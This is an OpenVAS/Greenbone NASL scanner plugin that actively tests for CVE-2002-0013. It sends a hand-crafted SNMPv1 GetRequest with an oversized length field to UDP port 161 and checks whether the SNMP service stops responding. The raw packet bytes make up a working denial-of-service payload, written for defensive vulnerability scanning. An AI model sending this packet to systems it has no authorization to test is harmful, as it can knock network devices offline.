# Copyright (C) 2021 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.147134");
  script_version("2021-11-11T13:22:25+0000");
  script_tag(name:"last_modification", value:"2021-11-12 11:32:18 +0000 (Fri, 12 Nov 2021)");
  script_tag(name:"creation_date", value:"2021-11-11 04:30:59 +0000 (Thu, 11 Nov 2021)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2002-0013");

  script_tag(name:"qod_type", value:"remote_probe");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("SNMP DoS Vulnerability (CVE-2002-0013) - Active Check");

  script_category(ACT_DENIAL);

  script_copyright("Copyright (C) 2021 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("gb_snmp_sysdescr_detect.nasl");
  script_mandatory_keys("SNMP/sysdescr/available");
  script_require_udp_ports("Services/udp/snmp", 161);

  script_tag(name:"summary", value:"Multiple implementations of SNMP are prone to a denial of
  service (DoS) and/or privilege escation vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted SNMP request and checks afterwards if the
  remote service doesn't respond to a SNMP sysDescr request anymore.

  Note: For a successful detection the remote SNMP service either needs to accept a default 'public'
  SNMPv1 / SNMPv2c community or a valid one needs to be given in the credentials configuration of
  the scanning task.");

  script_tag(name:"insight", value:"Vulnerabilities in the SNMPv1 request handling of a large
  number of SNMP implementations allow remote attackers to cause a denial of service or gain
  privileges via GetRequest, GetNextRequest and SetRequest messages, as demonstrated by the
  PROTOS c06-SNMPv1 test suite.");

  script_tag(name:"solution", value:"Contact your vendor for updates.");

  script_xref(name:"URL", value:"https://www.kb.cert.org/vuls/id/854306");
  script_xref(name:"URL", value:"https://web.archive.org/web/20200302171814/https://www.ee.oulu.fi/research/ouspg/PROTOS_Test-Suite_c06-snmpv1");

  exit(0);
}

include("snmp_func.inc");

port = snmp_get_port(default: 161);

community = snmp_get_community(port: port);
if (!community || community == "")
  exit(0);

if (snmp_v12c_sysdescr_accessible(port: port, community: community)) {
  size = strlen(community);
  sz = size % 256;

  data = raw_string(0x30, 0x2b, 0x02, 0x01, 0x00, 0x04, sz) +
         community +
         raw_string(0xa0, 0x1e, 0x02, 0x02, 0x04,
                    0xba, 0x02, 0x01, 0x00, 0x02, 0x01,
                    0x00, 0x30, 0x12, 0x30, 0x10, 0x06,
                    0x08, 0x2b, 0x06, 0x01, 0x02, 0x01,
                    0x01, 0x05, 0x00, 0x05, 0x84, 0xff,
                    0xff, 0xff, 0xff);

  soc = open_sock_udp(port);
  if (!soc)
    exit(0);

  send(socket: soc, data: data);
  close(soc);

  if (!snmp_v12c_sysdescr_accessible(port: port, community: community)) {
    report = 'The SNMP service did not response anymore after sending a packet with an oversized ' +
             'length field.';
    security_message(port: port, data: report, proto: "udp");
    exit(0);
  }

  exit(99);
}

exit(0);